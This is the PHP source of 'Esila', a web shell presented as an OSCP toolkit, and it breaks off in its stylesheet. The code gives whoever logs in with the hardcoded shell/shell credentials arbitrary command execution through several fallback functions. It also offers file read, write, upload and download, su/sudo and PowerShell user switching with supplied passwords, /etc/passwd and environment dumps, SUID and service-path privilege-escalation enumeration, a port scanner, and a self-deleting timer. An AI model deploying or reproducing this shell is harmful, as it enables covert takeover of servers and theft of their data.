<?php
$php_works = true;
error_reporting(0);

// PHP 5.6+ polyfills
if (!function_exists('str_contains')) { function str_contains($h,$n){return $n===''||strpos($h,$n)!==false;} }
if (!function_exists('str_starts_with')) { function str_starts_with($h,$n){return $n===''||strncmp($h,$n,strlen($n))===0;} }
if (!function_exists('array_key_first')) { function array_key_first($a){foreach($a as $k=>$v)return $k;return null;} }

// Session hardening - Windows IIS often has broken session save path
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $sp = @session_save_path();
    if (!$sp || !@is_writable($sp)) {
        $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
        if (@is_writable($tmp)) @session_save_path($tmp);
    }
}
if(!headers_sent()){@session_start();}
if(!isset($_SESSION)){$_SESSION=array();}

define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
define('DEFAULT_USER', 'shell');
define('DEFAULT_PASS', 'shell');
define('VERSION', '2.4');

// PowerShell-safe single-quote escaping for .ps1 scripts
function ps_quote($s) { return "'" . str_replace("'", "''", $s) . "'"; }

// Universal command execution - tries multiple methods
function esila_exec($cmd) {
    $out = '';
    $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $out = @shell_exec($cmd);
    } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
        @exec($cmd, $arr); $out = implode("\n", $arr);
    } elseif (function_exists('system') && !in_array('system', $disabled)) {
        ob_start(); @system($cmd); $out = ob_get_clean();
    } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
        ob_start(); @passthru($cmd); $out = ob_get_clean();
    } elseif (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $desc = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) { $out = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]); fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]); proc_close($p); }
    } elseif (function_exists('popen') && !in_array('popen', $disabled)) {
        $p = @popen($cmd, 'r');
        if (is_resource($p)) { $out = stream_get_contents($p); pclose($p); }
    }
    return ($out !== null && $out !== false) ? $out : '';
}

// .htaccess fix endpoint
if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
    header('Content-Type: application/json');
    $dir = dirname(__FILE__);
    $mode = isset($_POST['mode']) ? $_POST['mode'] : 'module';
    if ($mode === 'cgi') {
        $content = "Options +ExecCGI\nAddHandler cgi-script .php\n";
    } else {
        $content = "AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .php5 .php7 .phtml\n\n<IfModule mod_rewrite.c>\n    RewriteEngine On\n</IfModule>\n\n<FilesMatch \"\\.php$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n";
    }
    $ok = @file_put_contents($dir . '/.htaccess', $content);
    echo json_encode(array('ok' => $ok !== false, 'msg' => $ok !== false ? '.htaccess created successfully' : 'Failed to write .htaccess'));
    exit;
}

// Self-destruct
if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
    header('Content-Type: application/json');
    $minutes = intval(isset($_POST['minutes']) ? $_POST['minutes'] : 0);
    if ($minutes > 0 && $minutes <= 1440) {
        $delay = $minutes * 60;
        $self = __FILE__;
        if (IS_WIN) {
            $pings = $delay + 1;
            esila_exec("start /b cmd /c \"ping -n $pings 127.0.0.1 >nul & del /f " . escapeshellarg($self) . "\"");
        } else {
            esila_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
        }
        echo json_encode(['ok' => true, 'msg' => "Self destruct in $minutes minutes"]);
    } else {
        echo json_encode(['ok' => false, 'msg' => 'Invalid minutes (1-1440)']);
    }
    exit;
}

// Download handler
if (isset($_GET['download'])) {
    $f = $_GET['download'];
    if (is_file($f) && is_readable($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
    }
    exit;
}

// Cookie fallback auth
if (!isset($_SESSION['logged_in']) && isset($_COOKIE['esila_auth'])) {
    if ($_COOKIE['esila_auth'] === md5(DEFAULT_USER . ':' . DEFAULT_PASS)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
        $_SESSION['history'] = array();
    }
}

// Login
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === DEFAULT_USER && $_POST['password'] === DEFAULT_PASS) {
            $_SESSION['logged_in'] = true;
            $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
            $_SESSION['history'] = array();
            @setcookie('esila_auth', md5(DEFAULT_USER . ':' . DEFAULT_PASS), time() + 86400, '/');
            header('Location: ?');
            exit;
        } else {
            $login_error = "Invalid credentials";
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Esila</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes bgShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(0,122,255,0.1)}50%{box-shadow:0 0 30px rgba(0,122,255,0.25)}}
body{background:linear-gradient(135deg,#0d1117,#161b22,#0d1117,#1a1e24);background-size:400% 400%;animation:bgShift 20s ease infinite;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(rgba(255,255,255,0.03) 1px,transparent 1px);background-size:24px 24px;pointer-events:none;z-index:0}
.login-box{position:relative;background:rgba(22,27,34,0.85);backdrop-filter:blur(24px) saturate(1.4);-webkit-backdrop-filter:blur(24px) saturate(1.4);border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:48px 40px;width:380px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.5);z-index:1;transition:border-color .3s}
.login-box:hover{border-color:rgba(0,122,255,0.2)}
.login-box h1{font-size:32px;font-weight:700;margin-bottom:6px;background:linear-gradient(135deg,#007AFF,#5856D6,#bc8cff);background-size:200% 200%;animation:bgShift 4s ease infinite;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.login-box p.sub{color:#8b949e;font-size:13px;margin-bottom:32px}
.login-box input{width:100%;padding:12px 16px;margin-bottom:14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:10px;color:#e6edf3;font-size:15px;outline:none;transition:all .2s}
.login-box input:focus{border-color:#007AFF;box-shadow:0 0 0 3px rgba(0,122,255,0.15)}
.login-box button{width:100%;padding:12px;background:linear-gradient(135deg,#007AFF,#5856D6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:all .3s;animation:pulse 3s ease infinite}
.login-box button:hover{transform:translateY(-1px);box-shadow:0 4px 20px rgba(0,122,255,0.4)}
.err{color:#f85149;font-size:13px;margin-bottom:12px}
.php-fix-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);z-index:9999;display:flex;align-items:center;justify-content:center}
.php-fix-box{background:#161b22;border:1px solid rgba(248,81,73,0.3);border-radius:16px;padding:32px;max-width:480px;width:90%;text-align:center}
.php-fix-box h2{color:#f85149;margin-bottom:12px}
.php-fix-box p{color:#8b949e;font-size:14px;margin-bottom:16px;line-height:1.6}
.php-fix-box button{padding:10px 20px;border-radius:10px;border:none;font-size:14px;font-weight:600;cursor:pointer;margin:4px;transition:all .2s}
.php-fix-box .fix-btn{background:#007AFF;color:#fff}
.php-fix-box .fix-btn:hover{background:#0062cc}
.php-fix-box .fix-cgi{background:rgba(255,255,255,0.08);color:#e6edf3;border:1px solid rgba(255,255,255,0.1)}
.php-fix-status{margin-top:12px;font-size:13px;color:#3fb950}
</style></head><body>
<!-- PHP Detection: if PHP isn't processing, this literal tag will appear in the DOM -->
<span id="php-check" style="display:none"><?php echo 'PHP_OK'; ?></span>
<script>
document.addEventListener('DOMContentLoaded', function() {
    var check = document.getElementById('php-check');
    if (!check || check.textContent.trim() !== 'PHP_OK') {
        var overlay = document.createElement('div');
        overlay.className = 'php-fix-overlay';
        overlay.innerHTML = '<div class="php-fix-box">' +
            '<h2>PHP Not Executing</h2>' +
            '<p>This file is not being processed as PHP by the web server. The raw PHP code is being displayed instead of executed.</p>' +
            '<p>Click below to attempt an automatic fix by creating an .htaccess file:</p>' +
            '<button class="fix-btn" onclick="fixHtaccess(\'module\')">Fix: Apache mod_php</button>' +
            '<button class="fix-cgi" onclick="fixHtaccess(\'cgi\')">Fix: CGI Mode</button>' +
            '<div class="php-fix-status" id="fix-status"></div>' +
            '</div>';
        document.body.appendChild(overlay);
    }
});
function fixHtaccess(mode) {
    var status = document.getElementById('fix-status');
    if (mode === 'module') {
        status.innerHTML = '<strong>Create .htaccess manually with this content:</strong><br><code style="display:block;background:#0d1117;padding:8px;margin:8px 0;border-radius:6px;font-size:12px;text-align:left">AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .php5 .php7 .phtml\n&lt;FilesMatch "\\.php$"&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code>';
    } else {
        status.innerHTML = '<strong>Create .htaccess manually with this content:</strong><br><code style="display:block;background:#0d1117;padding:8px;margin:8px 0;border-radius:6px;font-size:12px;text-align:left">Options +ExecCGI\nAddHandler cgi-script .php</code>';
    }
    status.style.color = '#d29922';
}
</script>
<div class="login-box">
    <h1>Esila</h1>
    <p class="sub">Web Terminal v<?= VERSION ?> &middot; OSCP Toolkit</p>
    <?php if (!empty($login_error)) echo "<p class='err'>$login_error</p>"; ?>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required autofocus>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
    </form>
</div>
</body></html>
    <?php
    exit;
}

// Authenticated API endpoints
if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
$cwd = $_SESSION['cwd'];

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Autocomplete
if (isset($_POST['autocomplete'])) {
    $input = $_POST['autocomplete'];
    $parts = preg_split('/\s+/', $input);
    $last = end($parts);
    $dir = $cwd; $prefix = ''; $partial = $last;
    $sep = IS_WIN ? '\\' : '/';
    $hasSep = str_contains($last, '/') || (IS_WIN && str_contains($last, '\\'));
    if ($hasSep) {
        $normalized = IS_WIN ? str_replace('\\', '/', $last) : $last;
        $pp = explode('/', $normalized);
        $partial = array_pop($pp);
        $prefix = implode('/', $pp);
        if (IS_WIN && strlen($prefix) >= 2 && $prefix[1] === ':') {
            $dir = $prefix;
        } else {
            $dir = realpath($cwd . DIRECTORY_SEPARATOR . $prefix);
        }
        if (!$dir || !is_dir($dir)) exit;
    }
    $results = [];
    foreach (@scandir($dir) as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (str_starts_with(strtolower($entry), strtolower($partial))) {
            $suffix = is_dir($dir . DIRECTORY_SEPARATOR . $entry) ? $sep : '';
            $results[] = ($prefix !== '' ? $prefix . $sep : '') . $entry . $suffix;
        }
    }
    echo implode("\n", $results);
    exit;
}

// Switch user
if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
    header('Content-Type: application/json');
    $su_user = isset($_POST['su_user']) ? trim($_POST['su_user']) : '';
    $su_pass = isset($_POST['su_pass']) ? $_POST['su_pass'] : '';
    if ($su_user === '') {
        unset($_SESSION['su_user'], $_SESSION['su_pass']);
        echo json_encode(array('ok' => true, 'msg' => 'Switched back to default user', 'user' => trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null'))));
        exit;
    }
    if (IS_WIN) {
        $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
        $rid = mt_rand(10000,99999);
        $tmpf = $tmp . '\\esila_su_' . $rid . '.txt';
        $ps1 = $tmp . '\\esila_su_' . $rid . '.ps1';
        $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
            . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
            . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
            . "try {\r\n"
            . "  \$r = Invoke-Command -ComputerName localhost -Credential \$c -ScriptBlock { whoami } 2>&1\r\n"
            . "  \$r\r\n"
            . "} catch {\r\n"
            . "  try {\r\n"
            . '    Start-Process cmd -Credential $c -ArgumentList "/c whoami" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($tmpf) . "\r\n"
            . '    Get-Content ' . ps_quote($tmpf) . "\r\n"
            . '    Remove-Item ' . ps_quote($tmpf) . " -Force -ErrorAction SilentlyContinue\r\n"
            . "  } catch {\r\n"
            . "    Write-Output \$_.Exception.Message\r\n"
            . "  }\r\n"
            . "}\r\n"
            . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
        @file_put_contents($ps1, $ps_script);
        $test = esila_exec('powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1');
        @unlink($ps1);
    } else {
        $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
        if (strpos($test, $su_user) === false) {
            $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' whoami 2>&1');
        }
    }
    $test = trim($test);
    if (strpos($test, $su_user) !== false || strpos($test, strtolower($su_user)) !== false) {
        $_SESSION['su_user'] = $su_user;
        $_SESSION['su_pass'] = $su_pass;
        echo json_encode(array('ok' => true, 'msg' => 'Switched to ' . $su_user, 'user' => $su_user));
    } else {
        echo json_encode(array('ok' => false, 'msg' => 'Failed: ' . $test, 'user' => ''));
    }
    exit;
}

// Command execution
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if ($cmd === '') exit;
    $_SESSION['history'][] = $cmd;
    if (preg_match('/^\s*cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '' || $target === '~') $new = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
        elseif ($target[0] === '/' || (IS_WIN && strlen($target) >= 2 && $target[1] === ':')) $new = realpath($target);
        else $new = realpath($cwd . DIRECTORY_SEPARATOR . $target);
        if ($new && is_dir($new)) {
            $_SESSION['cwd'] = $new;
            echo "__CWD__:" . $new;
        } else {
            echo "cd: no such file or directory: $target\n";
        }
        exit;
    }
    // Build exec command with optional user context
    $su_user = isset($_SESSION['su_user']) ? $_SESSION['su_user'] : '';
    $su_pass = isset($_SESSION['su_pass']) ? $_SESSION['su_pass'] : '';
    if (IS_WIN) {
        $basecmd = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    } else {
        $basecmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    }
    if ($su_user !== '') {
        if (IS_WIN) {
            $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
            $r = mt_rand(10000,99999);
            $outf = $tmp . '\\esila_o' . $r . '.txt';
            $errf = $tmp . '\\esila_e' . $r . '.txt';
            $ps1 = $tmp . '\\esila_r' . $r . '.ps1';
            $cmd_esc = str_replace('"', '`"', $basecmd);
            $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
                . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
                . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
                . "\$cmd = " . ps_quote($basecmd) . "\r\n"
                . "try {\r\n"
                . "  Invoke-Command -ComputerName localhost -Credential \$c -ScriptBlock { param(\$x) cmd /c \$x } -ArgumentList \$cmd\r\n"
                . "} catch {\r\n"
                . "  try {\r\n"
                . '    Start-Process cmd -Credential $c -ArgumentList "/c ' . $cmd_esc . '" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($outf) . ' -RedirectStandardError ' . ps_quote($errf) . "\r\n"
                . '    Get-Content ' . ps_quote($outf) . ', ' . ps_quote($errf) . "\r\n"
                . '    Remove-Item ' . ps_quote($outf) . ', ' . ps_quote($errf) . " -Force -ErrorAction SilentlyContinue\r\n"
                . "  } catch {\r\n"
                . "    Write-Output \$_.Exception.Message\r\n"
                . "  }\r\n"
                . "}\r\n"
                . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
            @file_put_contents($ps1, $ps_script);
            $exec = 'powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1';
        } else {
            $exec = 'echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' bash -c ' . escapeshellarg($basecmd) . ' 2>&1';
        }
    } else {
        $exec = $basecmd;
    }
    echo esila_exec($exec);
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    header('Content-Type: application/json');
    $dest = (isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd) . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    echo json_encode(['ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)]);
    exit;
}

// File manager API
if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
    header('Content-Type: application/json');
    $path = isset($_POST['path']) ? $_POST['path'] : $cwd;
    if (!is_dir($path)) { echo json_encode(['error' => 'Not a directory']); exit; }
    $items = [];
    foreach (@scandir($path) as $f) {
        if ($f === '.') continue;
        $fp = $path . DIRECTORY_SEPARATOR . $f;
        $stat = @stat($fp);
        $perms = IS_WIN ? ((is_readable($fp) ? 'R' : '-') . (is_writable($fp) ? 'W' : '-') . (is_executable($fp) ? 'X' : '-')) : substr(sprintf('%o', @fileperms($fp)), -4);
        $items[] = [
            'name' => $f,
            'path' => realpath($fp) ?: $fp,
            'is_dir' => is_dir($fp),
            'size' => is_file($fp) ? filesize($fp) : 0,
            'perms' => $perms,
            'mtime' => $stat ? date('Y-m-d H:i', $stat['mtime']) : '',
            'readable' => is_readable($fp),
            'writable' => is_writable($fp),
        ];
    }
    echo json_encode(['path' => realpath($path), 'items' => $items]);
    exit;
}

// File actions
if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
    header('Content-Type: application/json');
    $type = isset($_POST['type']) ? $_POST['type'] : '';
    $path = isset($_POST['path']) ? $_POST['path'] : '';
    switch ($type) {
        case 'delete':
            echo json_encode(['ok' => is_dir($path) ? @rmdir($path) : @unlink($path)]);
            break;
        case 'rename':
            echo json_encode(['ok' => @rename($path, dirname($path) . DIRECTORY_SEPARATOR . basename(isset($_POST['newname']) ? $_POST['newname'] : ''))]);
            break;
        case 'chmod':
            echo json_encode(['ok' => @chmod($path, octdec(isset($_POST['mode']) ? $_POST['mode'] : '0644'))]);
            break;
        case 'read':
            echo json_encode(['content' => @file_get_contents($path)]);
            break;
        case 'write':
            echo json_encode(['ok' => @file_put_contents($path, isset($_POST['content']) ? $_POST['content'] : '') !== false]);
            break;
        case 'mkdir':
            echo json_encode(['ok' => @mkdir($path, 0755, true)]);
            break;
    }
    exit;
}

// System info
if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
    header('Content-Type: application/json');
    if (IS_WIN) {
        $info = [
            'os' => php_uname(),
            'kernel' => php_uname('r'),
            'hostname' => gethostname(),
            'user' => trim(esila_exec('whoami 2>nul')),
            'uid' => trim(esila_exec('whoami /priv 2>nul')),
            'groups' => trim(esila_exec('whoami /groups 2>nul')),
            'ip_addrs' => trim(esila_exec('ipconfig 2>nul')),
            'uptime' => trim(esila_exec('net stats srv 2>nul | findstr "since"')),
            'disk' => trim(esila_exec('wmic logicaldisk get caption,size,freespace 2>nul')),
            'interfaces' => trim(esila_exec('ipconfig /all 2>nul')),
            'env' => trim(esila_exec('set 2>nul')),
            'processes' => trim(esila_exec('tasklist /V 2>nul')),
            'passwd' => 'N/A on Windows',
            'crontab' => trim(esila_exec('schtasks /query 2>nul')),
            'php_ver' => phpversion(),
            'php_disabled' => ini_get('disable_functions'),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
        ];
    } else {
        $info = [
            'os' => php_uname(),
            'kernel' => php_uname('r'),
            'hostname' => gethostname(),
            'user' => trim(esila_exec('whoami 2>/dev/null')),
            'uid' => trim(esila_exec('id 2>/dev/null')),
            'groups' => trim(esila_exec('groups 2>/dev/null')),
            'ip_addrs' => trim(esila_exec("hostname -I 2>/dev/null || ifconfig 2>/dev/null | grep 'inet ' | awk '{print \$2}'")),
            'uptime' => trim(esila_exec('uptime 2>/dev/null')),
            'disk' => trim(esila_exec('df -h 2>/dev/null')),
            'interfaces' => trim(esila_exec('ip -br addr 2>/dev/null || ifconfig 2>/dev/null')),
            'env' => trim(esila_exec('env 2>/dev/null')),
            'processes' => trim(esila_exec('ps aux --sort=-%mem 2>/dev/null | head -30')),
            'passwd' => @file_get_contents('/etc/passwd'),
            'crontab' => trim(esila_exec('crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')),
            'php_ver' => phpversion(),
            'php_disabled' => ini_get('disable_functions'),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
        ];
    }
    echo json_encode($info);
    exit;
}

// SUID finder (Linux) / Privilege enumeration (Windows)
if (isset($_POST['action']) && $_POST['action'] === 'find_suid') {
    header('Content-Type: application/json');
    if (IS_WIN) {
        $out = "=== Current Privileges ===\n" . trim(esila_exec('whoami /priv 2>nul'));
        $out .= "\n\n=== Unquoted Service Paths ===\n" . trim(esila_exec('wmic service get name,displayname,pathname,startmode 2>nul | findstr /I /V "C:\\Windows\\\\" | findstr /I /V """'));
        $out .= "\n\n=== Scheduled Tasks (writable) ===\n" . trim(esila_exec('schtasks /query /fo LIST /V 2>nul | findstr /I "Task To Run"'));
        echo json_encode(['result' => $out ?: 'No privilege escalation vectors found.']);
    } else {
        echo json_encode(['result' => trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))]);
    }
    exit;
}

// Writable dirs finder
if (isset($_POST['action']) && $_POST['action'] === 'find_writable') {
    header('Content-Type: application/json');
    if (IS_WIN) {
        $drive = getenv('SystemDrive') ?: 'C:';
        echo json_encode(['result' => trim(esila_exec('icacls ' . $drive . '\\ /findsid Everyone /T 2>nul | findstr /I "Everyone"'))]);
    } else {
        echo json_encode(['result' => trim(esila_exec('find / -writable -type d 2>/dev/null | head -50'))]);
    }
    exit;
}

// Network tools
if (isset($_POST['action']) && $_POST['action'] === 'nettool') {
    header('Content-Type: application/json');
    $tool = isset($_POST['tool']) ? $_POST['tool'] : '';
    $target = isset($_POST['target']) ? $_POST['target'] : '';
    if (!preg_match('/^[a-zA-Z0-9\.\-\:\/]+$/', $target)) { echo json_encode(['result' => 'Invalid target']); exit; }
    $out = '';
    $t = escapeshellarg($target);
    switch ($tool) {
        case 'ping':
            $out = esila_exec(IS_WIN ? "ping -n 4 $t 2>&1" : "ping -c 4 $t 2>&1");
            break;
        case 'portscan':
            $ports = array(21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,8080,8443);
            $result = '';
            foreach ($ports as $p) {
                $fp = @fsockopen($target, $p, $errno, $errstr, 1);
                if ($fp) { $result .= "Port $p: OPEN\n"; fclose($fp); }
            }
            $out = $result ? $result : "No open ports found on common ports.";
            break;
        case 'traceroute':
            $out = esila_exec(IS_WIN ? "tracert $t 2>&1" : "traceroute $t 2>&1 || tracepath $t 2>&1");
            break;
        case 'dns':
            $out = esila_exec(IS_WIN ? "nslookup $t 2>&1" : "nslookup $t 2>&1 || dig $t 2>&1 || host $t 2>&1");
            break;
        case 'arp':
            $out = esila_exec("arp -a 2>&1");
            break;
        case 'curl':
            $out = esila_exec(IS_WIN ? "curl -sI $t 2>&1 || powershell -c \"try{(Invoke-WebRequest -Uri $t -Method Head -UseBasicParsing).Headers|Format-List}catch{\\$_.Exception.Message}\" 2>&1" : "curl -sI $t 2>&1");
            break;
    }
    echo json_encode(['result' => $out]);
    exit;
}

// Change password
if (isset($_POST['action']) && $_POST['action'] === 'chpass') {
    header('Content-Type: application/json');
    $old = isset($_POST['old_pass']) ? $_POST['old_pass'] : '';
    $new_pass = isset($_POST['new_pass']) ? $_POST['new_pass'] : '';
    echo json_encode(['ok' => false, 'msg' => 'Password change requires editing the file directly (DEFAULT_USER / DEFAULT_PASS constants)']);
    exit;
}

$username = trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null')) ?: (function_exists('get_current_user') ? get_current_user() : 'unknown');
$hostname = trim(esila_exec(IS_WIN ? 'hostname 2>nul' : 'hostname 2>/dev/null')) ?: (function_exists('gethostname') ? gethostname() : 'unknown');
$home = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
$history = $_SESSION['history'];
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Esila - <?= htmlspecialchars($hostname) ?></title>
<style>
:root {
    --bg: #0d1117;
    --surface: rgba(22,27,34,0.85);
    --surface-solid: #161b22;
    --border: rgba(255,255,255,0.08);
    --border-hover: rgba(255,255,255,0.15);
    --text: #e6edf3;
    --text-secondary: #8b949e;
    --text-dim: #484f58;
    --accent: #007AFF;
    --accent-hover: #0062cc;
    --green: #3fb950;
    --orange: #d29922;
    --red: #f85149;
    --purple: #bc8cff;
    --cyan: #79c0ff;
    --pink: #f778ba;
    --radius: 12px;
    --radius-sm: 8px;
    --glass-blur: blur(20px) saturate(1.4);
    --sidebar-width: 240px;
    --font-mono: 'SF Mono','Fira Code','Cascadia Code','JetBrains Mono',monospace;
}
* { margin:0; padding:0; box-sizing:border-box; }
@keyframes bgShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
@keyframes glowPulse{0%,100%{box-shadow:0 0 8px rgba(0,122,255,0.15)}50%{box-shadow:0 0 16px rgba(0,122,255,0.3)}}
body { background:linear-gradient(135deg,#0d1117,#161b22,#0d1117,#131820);background-size:400% 400%;animation:bgShift 25s ease infinite; color:var(--text); font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif; overflow:hidden; height:100vh; }
body::before { content:''; position:fixed; inset:0; background-image:radial-gradient(rgba(255,255,255,0.025) 1px,transparent 1px); background-size:20px 20px; pointer-events:none; z-index:0; }
::-webkit-scrollbar { width:5px; }
::-webkit-scrollbar-track { background:transparent; }
::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.12); border-radius:3px; }
::-webkit-scrollbar-thumb:hover { background:rgba(255,255,255,0.2); }
::selection { background:rgba(0,122,255,0.3); }

/* Top bar */
.topbar { height:36px; background:rgba(13,17,23,0.95); border-bottom:1px solid var(--border); display:flex; align-items:center; padding:0 16px; font-size:12px; color:var(--text-dim); gap:16px; flex-shrink:0; z-index:50; backdrop-filter:blur(12px); }
.topbar .tb-accent { color:var(--accent); font-weight:500; }
.topbar .tb-path { color:var(--text-secondary); font-family:var(--font-mono); font-size:11px; }
.topbar .spacer { flex:1; }
.topbar .clock { font-family:var(--font-mono); color:var(--text-secondary); }

/* Layout */
.app { display:flex; height:100vh; flex-direction:column; }
.app-body { display:flex; flex:1; overflow:hidden; }

/* Sidebar */
.sidebar { width:var(--sidebar-width); background:linear-gradient(180deg,rgba(22,27,34,0.9),rgba(13,17,23,0.95)); backdrop-filter:var(--glass-blur); -webkit-backdrop-filter:var(--glass-blur); border-right:1px solid var(--border); display:flex; flex-direction:column; flex-shrink:0; transition:width .3s ease,transform .3s ease; z-index:100; }
.sidebar.collapsed { width:0; overflow:hidden; border:none; }
.sidebar-header { padding:20px 16px 12px; display:flex; justify-content:space-between; align-items:flex-start; }
.logo { font-size:24px; font-weight:800; background:linear-gradient(135deg,#007AFF,#5856D6,#bc8cff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
.ver { font-size:11px; color:var(--text-dim); margin-top:2px; }
.collapse-btn { background:none; border:none; color:var(--text-dim); cursor:pointer; font-size:18px; line-height:1; padding:4px; }
.collapse-btn:hover { color:var(--text); }
.nav { flex:1; padding:8px; overflow-y:auto; }
.nav-item { display:flex; align-items:center; gap:10px; padding:10px 12px; border-radius:var(--radius-sm); cursor:pointer; color:var(--text-secondary); font-size:14px; transition:all .15s ease; margin-bottom:2px; }
.nav-item:hover { background:rgba(255,255,255,0.05); color:var(--text); }
.nav-item.active { background:rgba(0,122,255,0.12); color:var(--accent); border-left:3px solid var(--accent); padding-left:9px; }
.nav-item svg { width:18px; height:18px; flex-shrink:0; }
.sidebar-footer { padding:12px 16px; border-top:1px solid var(--border); }
.user-info { display:flex; align-items:center; gap:8px; font-size:12px; color:var(--text-dim); }
.user-dot { width:8px; height:8px; background:var(--green); border-radius:50%; animation:glowPulse 2s ease infinite; }

/* Main area */
.main { flex:1; display:flex; flex-direction:column; overflow:hidden; min-width:0; }
.panel { display:none; flex:1; flex-direction:column; overflow:hidden; }
.panel.active { display:flex; animation:fadeIn .2s ease; }

/* Panel header */
